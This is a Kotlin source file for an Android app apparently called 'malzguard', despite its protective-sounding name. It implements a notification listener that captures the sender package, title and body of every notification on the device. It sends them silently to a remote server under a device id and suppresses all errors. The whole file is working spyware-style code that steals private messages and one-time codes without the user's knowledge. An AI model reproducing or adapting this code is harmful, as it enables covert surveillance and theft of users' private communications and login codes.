package com.example.malzguard

import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL
import org.json.JSONObject

class NotifListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val pkg = sbn.packageName ?: return
            val extras = sbn.notification.extras ?: return
            val title = extras.getCharSequence("android.title")?.toString() ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            if (title.isEmpty() && text.isEmpty()) return
            val id = getSharedPreferences("mg", Context.MODE_PRIVATE).getString("id", "") ?: ""
            if (id.isEmpty()) return
            val j = JSONObject().put("pkg", pkg).put("title", title).put("body", text)
            Thread { post("${Config.SERVER}/api/notif/$id", j.toString()) }.start()
        } catch (e: Exception) {}
    }

    private fun post(url: String, body: String) {
        try {
            val c = URL(url).openConnection() as HttpURLConnection
            c.connectTimeout = 10000; c.readTimeout = 15000
            c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "application/json")
            val os: OutputStream = c.outputStream
            os.write(body.toByteArray()); os.flush(); os.close()
            try { c.responseCode; c.inputStream?.close() } catch (e: Exception) {}
            try { c.disconnect() } catch (e: Exception) {}
        } catch (e: Exception) {}
    }
}
